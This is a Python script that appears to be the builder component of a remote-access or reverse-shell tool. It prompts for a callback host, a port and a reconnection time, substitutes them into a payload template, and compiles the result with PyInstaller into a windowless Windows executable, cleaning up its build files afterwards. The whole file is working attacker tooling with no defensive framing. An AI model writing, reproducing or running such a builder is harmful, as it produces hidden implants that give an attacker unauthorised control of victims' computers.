import os
import click
import shutil
import platform
import subprocess

# absolute paths
current_directory = os.getcwd()
source_file_path = os.path.join(current_directory,'module_builder','source_code.txt')
print(source_file_path)

# colors
red = "\033[31m"
gray = "\033[90m"
blue = "\033[34m"
reset = "\033[0m"
green = "\033[32m"


@click.command()
@click.option("--name", prompt="[+] Set Name", help="set name", type=str)
@click.option("--host", prompt="[+] Set HOST", help="set host", type=str)
@click.option("--port", prompt="[+] Set PORT", help="set port", type=int)
@click.option("--time", prompt="[+] Set Reconnection Time", help="set time", type=str)
def main(name, host, port, time):

    print(f"{green}[*] Generating Payload, Please Wait...{reset}")
    
    payload_name = name + '.py'
    source_file = open(source_file_path, 'r')
    payload_file = open(payload_name, 'w')
    payload_file.write(source_file.read())
    source_file.close()
    payload_file.close()

    with open(payload_name, 'r') as file:
        code = file.read()
        code = code.replace('<TIME>', time)
        code = code.replace('<HOST>', host)
        code = code.replace('<PORT>', str(port))
        file.close()

    with open(payload_name, 'w') as file:
        file.write(code)
        file.close()

    command = f"pyinstaller --onefile --noconsole {payload_name}"

    print(f"{green}[*] Converting Payload into EXE {reset}")

    if platform.system() == 'Windows':
        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, executable='/bin/bash')

    # removing file and dir after compiling
    os.remove(payload_name)
    os.remove(name + '.spec')
    shutil.rmtree("build")

    print(f"{green}[*] Payload EXE file saved as {payload_name} in '/dist' directory.{reset}")
